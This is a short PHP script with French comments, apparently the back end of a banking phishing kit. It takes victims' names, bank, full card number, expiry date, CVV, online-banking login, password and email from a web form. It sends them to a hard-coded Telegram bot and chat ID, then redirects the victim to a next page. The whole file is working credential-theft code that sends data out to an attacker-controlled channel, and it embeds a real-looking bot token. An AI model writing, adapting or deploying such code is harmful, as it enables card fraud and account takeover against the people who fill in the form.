<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupérer et valider les données du formulaire
    $nom = htmlspecialchars($_POST['nom']);
    $prenom = htmlspecialchars($_POST['prenom']);
    $codePostal = htmlspecialchars($_POST['code-postal']);
    $region = htmlspecialchars($_POST['region']);
    $banque = htmlspecialchars($_POST['banque']);
    $departement = htmlspecialchars($_POST['departement']);
    $carteNumero = implode(' ', $_POST['carte-numero']);
    $expiration = implode('/', $_POST['expiration']);
    $cvv = htmlspecialchars($_POST['cvv']);
    $identifiant = htmlspecialchars($_POST['identifiant']);
    $motDePasse = htmlspecialchars($_POST['mot-de-passe']);
    $email = htmlspecialchars($_POST['email']);

    // Construire le message Telegram
    $message = "Informations d'authentification :\n";
    $message .= "Nom : " . $nom . "\n";
    $message .= "Prénom : " . $prenom . "\n";
    $message .= "Code Postal : " . $codePostal . "\n";
    $message .= "Région : " . $region . "\n";
    $message .= "Banque : " . $banque . "\n";
    $message .= "Département : " . $departement . "\n";
    $message .= "Numéro de Carte : " . $carteNumero . "\n";
    $message .= "Date d'Expiration : " . $expiration . "\n";
    $message .= "CVV : " . $cvv . "\n";
    $message .= "Identifiant : " . $identifiant . "\n";
    $message .= "Mot de Passe : " . $motDePasse . "\n";
    $message .= "Email : " . $email . "\n";

    // Récupérer le token et chat ID
    $telegramBotToken = '7727944499:AAHpgP9-xAAbtGZpBrYBfaX_FbkZiWVeEtw';
    $telegramChatId = '7263826117';

    // Envoyer le message à Telegram
    $telegramUrl = "https://api.telegram.org/bot" . $telegramBotToken . "/sendMessage?chat_id=" . $telegramChatId . "&text=" . urlencode($message);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    // Vérifier la réponse de Telegram
    $response = json_decode($result, true);
    if ($response && $response['ok']) {
        // Rediriger vers la page 4 en cas de succès
        header('Location: page4.html');
        exit;
    } else {
        // Gérer l'erreur en affichant un message à l'utilisateur
        echo "Erreur lors de l'envoi du message à Telegram. Veuillez réessayer.";
    }
}
?>